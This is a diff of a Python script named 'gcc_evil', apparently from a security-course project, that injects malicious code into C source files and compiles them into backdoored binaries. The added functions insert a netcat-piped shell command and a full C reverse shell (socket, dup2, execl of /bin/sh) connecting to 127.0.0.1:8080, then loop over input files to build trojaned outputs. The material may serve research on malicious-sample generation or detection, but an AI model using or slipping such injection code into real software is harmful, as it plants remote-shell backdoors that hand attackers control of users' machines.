@@ -4,15 +4,11 @@
 import sys, random, os
 import subprocess
 if len(sys.argv)==1:
-    prompt = 'Usage: gcc_evil file...\n'
+    prompt = 'Usage: gcc_evil file [file...]\n'
     print(prompt)
     exit(0)
 
 global f2, ret_place, main_place
-f2 = open(sys.argv[1],'r').read()
-ret_place = f2.find('return 0;')
-main_place = f2.find('int main')
-evil_code=''
 
 def exp1(s):
     evil_code = f2[:main_place]
@@ -81,6 +77,16 @@ void evil(){
     return evil_code
 
 def exp4(s):
+    
+    evil_code= f2[:ret_place]
+    evil_code+= """
+    system(\"/bin/sh | nc 127.0.0.1 8080\");
+    return;
+"""
+    evil_code+= f2[ret_place:]
+    return evil_code
+
+def exp5(s):
     evil_code = f2[:main_place]
     evil_code+="""
 
@@ -115,21 +121,68 @@ void evil(){
     evil_code += f2[ret_place:]
     return evil_code
 
-exploit_list = [exp1,exp2,exp3,exp4]
-s = open("shellcode1.txt","r").read()
-s = s.split('unsigned char buf[] =')[1:]
-s = [i.split(';')[0] for i in s]
-print(len(s))
-i = random.randint(0,len(exploit_list)-1)
-i2 = random.randint(0,len(s)-1)
-print(i,i2)
-evil_code = exploit_list[i](s[i2])
-#print(evil_code)
+def exp6(s):
+    evil_code = f2[:main_place]
+    evil_code+='''
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
 
-tmp_name = "tmp_c_for_evil_compiler.c"
+void evil(struct sockaddr_in client){
+  int scktd;
+  scktd = socket(AF_INET,SOCK_STREAM,0);
+  connect(scktd,(struct sockaddr *)&client,sizeof(client));
 
-with open(tmp_name,'w') as f:
-    f.write(evil_code)
+  dup2(scktd,0); // STDIN
+  dup2(scktd,1); // STDOUT
+  dup2(scktd,2); // STDERR
+  
+  execl("/bin/sh","sh","-i",NULL,NULL);
+  
+  return;
+}
 
-os.system('gcc '+tmp_name) 
-#os.system('rm '+tmp_name)
+void tmp(){
+  struct sockaddr_in client;
+ 
+  client.sin_family = AF_INET;
+  client.sin_addr.s_addr = inet_addr("127.0.0.1");
+  client.sin_port = htons(8080);
+    
+  evil(client);
+
+  return;
+}
+
+'''
+
+    evil_code += f2[main_place:ret_place]
+    evil_code += '''
+    tmp();
+'''
+
+    evil_code += f2[ret_place:]
+    return evil_code
+
+
+for names in sys.argv[1:]:
+
+    f2 = open(names,'r').read()
+    ret_place = f2.find('return 0;')
+    main_place = f2.find('int main')
+
+    exploit_list = [exp1,exp2,exp3,exp4,exp5,exp6]
+    s = 'a'
+    for i in range(len(exploit_list)):
+        i2 = random.randint(0,len(s)-1)
+        print(i,i2)
+        evil_code = exploit_list[i](s[i2])
+        #print(evil_code)
+
+        tmp_name = "tmp_c_for_evil_compiler.c"
+
+        with open(tmp_name,'w') as f:
+            f.write(evil_code)
+
+        os.system('gcc '+tmp_name+' -o /home/ais3/AIS3-2020/final_project/output/out_{}_{}'.format(names.replace('./','',1).replace('.c',''),i)) 
+        os.system('rm '+tmp_name)
